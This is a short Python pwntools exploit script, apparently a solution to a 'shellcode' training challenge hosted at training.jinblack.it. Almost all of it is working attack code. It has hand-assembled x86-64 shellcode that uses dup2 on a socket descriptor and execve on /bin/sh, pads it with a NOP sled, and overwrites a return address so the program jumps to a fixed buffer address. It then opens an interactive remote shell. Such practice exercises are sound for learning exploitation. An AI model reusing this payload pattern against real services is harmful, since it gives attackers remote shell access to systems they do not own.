from pwn import *
import time
#context.terminal = ['tmux', 'splitw', '-h']
'''
context.terminal = ['gnome-terminal', '-e']
r = process("./shellcode")
gdb.attach(r, """
	c
	""")
'''
r = remote("training.jinblack.it", 2005)
#r = remote("localhost", 2005)

#input("wait")
#print(r.recvuntil("name?\n"))

buffer = 0x4040c0
buffer_jump = 0x4040d0

'''
DUP2 IN
mov rax, 0x21
mov rdi, 0x4
mov rsi, 0x0
syscall

DUP2 OUT
mov rax, 0x21
mov rdi, 0x4
mov rsi, 0x1
syscall

EXECVE
mov rax, 0x3b
mov rdi, 0x4040c0
xor rsi, rsi
xor rdx, rdx
syscall

'''

dup2_in = b"\x48\xC7\xC0\x21\x00\x00\x00\x48\xC7\xC7\x04\x00\x00\x00\x48\xC7\xC6\x00\x00\x00\x00\x0F\x05"
dup2_out = b"\x48\xC7\xC0\x21\x00\x00\x00\x48\xC7\xC7\x04\x00\x00\x00\x48\xC7\xC6\x01\x00\x00\x00\x0F\x05"
execve = b"\x48\xC7\xC0\x3B\x00\x00\x00\x48\xC7\xC7\xC0\x40\x40\x00\x48\x31\xF6\x48\x31\xD2\x0F\x05"

shellcode = b"/bin/sh\x00"

xxx = dup2_in + dup2_out + execve

shellcode = shellcode + xxx.rjust(1008, b"\x90")
payload = shellcode + p64(buffer_jump)

r.send(payload)

r.interactive()
